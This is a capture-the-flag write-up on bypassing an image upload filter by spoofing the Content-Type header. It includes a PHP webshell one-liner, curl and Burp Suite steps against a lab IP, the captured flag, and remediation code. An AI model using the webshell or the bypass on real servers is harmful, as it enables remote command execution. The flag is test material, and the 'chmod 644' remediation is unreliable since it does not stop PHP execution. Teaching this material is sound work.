# 🚩 7 : Unrestricted File Upload

## 📝 Overview

The upload page at `?page=upload` asks for an image file. The server decides whether to accept the file by reading the `Content-Type` header, which is a label attached to the request that declares what type of file is being sent. The problem is that this label comes from whoever is making the request, and can say anything. The server never opens the file to check what is actually inside it.

So we sent a PHP script with a label that said "this is a JPEG." The server believed us, saved the file, and handed over the flag.

## 🔍 The Vulnerability

### What is a MIME type?

MIME stands for Multipurpose Internet Mail Extensions. It started as a way to label email attachments so that mail clients knew how to handle them, and the concept was later adopted by the web. Today, every file transferred over HTTP carries a MIME type that tells the recipient what kind of data it contains.

MIME types follow a simple format: a category, a slash, and a specific type. For example `image/jpeg` means "this is an image, specifically a JPEG." Other common ones are `text/html`, `application/pdf`, and `video/mp4`.

When you upload a file through a browser, the browser reads the file's extension and automatically sets the appropriate MIME type in the `Content-Type` header of the request. The server on the other end reads that header to decide what to do with the file.

### Why MIME types cannot be trusted

The `Content-Type` header is set by the client, which means the person sending the request controls it entirely. A browser sets it automatically and honestly, but curl, Burp Suite, or any HTTP tool lets you set it to whatever you want.

There is nothing stopping someone from sending a PHP file with `Content-Type: image/jpeg`. The server sees the label, trusts it, and processes the file accordingly. If the server's only check is that header, the entire upload filter is bypassed by changing one line of text.

### What is a webshell?

A webshell is a script uploaded to a server that lets someone run commands on it remotely through a browser. The simplest PHP version is one line:

```php
<?php echo "hacked"; ?>
```

Once saved on the server as a `.php` file and visited via URL, the server executes it. A more powerful version takes commands as URL parameters:

```php
<?php system($_GET['cmd']); ?>
```

Visiting `evil.php?cmd=ls` would list all files on the server.

### What the server actually checks

The server reads the `Content-Type` header and accepts the file if it looks like an image. It does not read the file's actual contents, does not check magic bytes (the first few bytes of a real image), and does not rename or sanitize the filename before saving it. A file uploaded as `evil.php` is saved as `evil.php`.

### What worked and what didn't

We tested several approaches to understand exactly how the server filters uploads:

| File sent | Result | Flag |
|-----------|--------|------|
| `evil.php` uploaded normally | Blocked — server rejects `text/php` | No |
| `evil.jpg` containing PHP code | Accepted — but saved as `.jpg`, never executed | No |
| `evil.php.jpg` | Accepted — final extension is `.jpg`, not executed | No |
| `evil.jpg.php` | Rejected — server blocks `.php` as final extension | No |
| `evil.php` with spoofed `Content-Type: image/jpeg` | Accepted and executed | Yes |

The server blocks files whose final extension is `.php` if sent normally, and ignores files whose final extension is `.jpg` even if they contain PHP code. The only path to the flag is sending a `.php` file while lying about its MIME type.

## 🛠 The Exploit

### Method 1: curl

curl is a command line tool that lets you build HTTP requests manually, including setting any header you want. This means you can send a PHP file while telling the server it is a JPEG, bypassing the browser entirely.

**Step 1: Create the PHP file**

```bash
echo '<?php echo "hacked"; ?>' > /tmp/evil.php
```

This creates a file at `/tmp/evil.php` with one line of PHP code inside it.

**Step 2: Upload with a spoofed Content-Type**

```bash
curl -X POST "http://192.168.64.2/?page=upload" \
  -F "Upload=Upload" \
  -F "uploaded=@/tmp/evil.php;type=image/jpeg"
```

What each part does:

`-X POST` sends a POST request, which is what HTML forms use when submitting data.

`-F "Upload=Upload"` simulates clicking the Upload button in the form.

`-F "uploaded=@/tmp/evil.php;type=image/jpeg"` sends the file at `/tmp/evil.php` and declares its MIME type as `image/jpeg` using the `;type=` suffix. This is the lie that bypasses the server's check.

The server reads `Content-Type: image/jpeg`, accepts the file, saves it as `evil.php`, and returns the flag.

### Method 2: Burp Suite

Burp Suite is a web security tool used by penetration testers. It works as a proxy, sitting between your browser and the server and intercepting every request before it arrives. This lets you read and modify anything in the request, including headers, after the browser has prepared it but before the server sees it.

**Step 1: Download Burp Suite**

Download the free Community Edition from `https://portswigger.net/burp/communitydownload`. Open it, click Next, then Start Burp.

**Step 2: Install Burp's certificate**

Burp decrypts your traffic to be able to read and modify it. Without its certificate installed, Brave will show security warnings and block the traffic.

With Burp running, open your browser and go to `http://127.0.0.1:8080`. You will see a Burp page. Click CA Certificate in the top right to download `cacert.der`.

Then open Terminal and run:

```bash
sudo security add-trusted-cert -d -r trustRoot -k /Library/Keychains/System.keychain ~/Downloads/cacert.der
```

Enter your password when prompted. Quit the browser completely and reopen it.

**Step 3: Launch Brave through Burp**

Close Brave, then run this in Terminal:

```bash
open -a "Brave Browser" --args --proxy-server="127.0.0.1:8080"
```

This starts Brave with all its traffic routed through Burp.

**Step 4: Create the PHP file**

```bash
echo '<?php echo "hacked"; ?>' > ~/Desktop/evil.php
```

**Step 5: Turn intercept on in Burp**

In Burp Suite click Proxy, then Intercept. Make sure the button reads Intercept is on.

**Step 6: Upload in Brave**

Go to `http://192.168.64.2/?page=upload`. Click Choose File, select `evil.php` from your Desktop, and click Upload.

Brave will freeze. This is expected. Burp has caught the request before it reached the server.

**Step 7: Modify the Content-Type**

Switch to Burp Suite. In the Intercept tab you will see the raw request. Inside it, find this line:

```
Content-Type: text/php

```

Click on it and change it to:

```
Content-Type: image/jpeg

```

**Step 8: Forward the request**

Click Forward. Burp sends the modified request to the server. Switch back to Brave; the flag is there.

**Step 9: Turn the proxy off**

When you are done, quit Burp Suite and relaunch Brave normally. If you leave the proxy on, all your internet traffic will keep going through Burp and pages will stop loading.

## 🏁 Result

```
FLAG: 46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8
```

## 🌍 Real-World Impact

Unrestricted file upload is one of the most damaging vulnerabilities a web application can have. Once an attacker uploads a working webshell, they effectively have a terminal on the server.

From there they can read every file on the machine, including database credentials, API keys, and user data. They can run arbitrary commands, install persistent backdoors that survive server restarts, and use the compromised machine as a launchpad to reach other systems on the same internal network that are not exposed to the internet.

A well-known case is the 2017 Equifax breach. Attackers exploited a file upload vulnerability in Apache Struts and walked away with the personal data of 147 million people.

## 🛡️ Remediation Strategies

### Verify the file contents, not the header

The `Content-Type` header is set by the client and cannot be trusted. PHP's `finfo` extension reads the actual file contents and checks the magic bytes, which are the first few bytes that identify a real image:

```php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['uploaded']['tmp_name']);

if (!in_array($mime, ['image/jpeg', 'image/png', 'image/gif'])) {
    die("Invalid file type.");
}
finfo_close($finfo);
```

### Rename uploaded files

Never keep the original filename. Generate a random name with a safe extension so that even if a PHP file slips through, it cannot be executed under its original name:

```php
$newname = bin2hex(random_bytes(16)) . '.jpg';
move_uploaded_file($tmp, '/var/uploads/' . $newname);
```

### Store files outside the web root

Files in `/var/www/html/uploads/` are directly accessible via URL. Moving the upload directory outside the web root means uploaded files can never be visited directly in a browser, let alone executed:

```
/var/uploads/    outside web root, not reachable via URL
/var/www/html/   web root
```

### Remove execute permissions from the uploads folder

Even if a PHP file ends up in the uploads folder, the web server should not be able to execute it:

```bash
chmod -R 644 /var/www/html/uploads/
```

### Whitelist file extensions server-side

Only accept specific extensions and reject everything else. This should always be combined with content verification, never used alone:

```php
$allowed = ['jpg', 'jpeg', 'png', 'gif'];
$ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));

if (!in_array($ext, $allowed)) {
    die("File type not allowed.");
}
```
---
## 📊 Attack Chain Summary
1. Found upload form at ?page=upload
2. Server trusts Content-Type header, never checks file contents
3. Created evil.php with PHP code inside
4. curl: sent evil.php with Content-Type: image/jpeg
   Burp Suite: intercepted upload request, changed Content-Type to image/jpeg
5. Server accepted the file and returned the flag
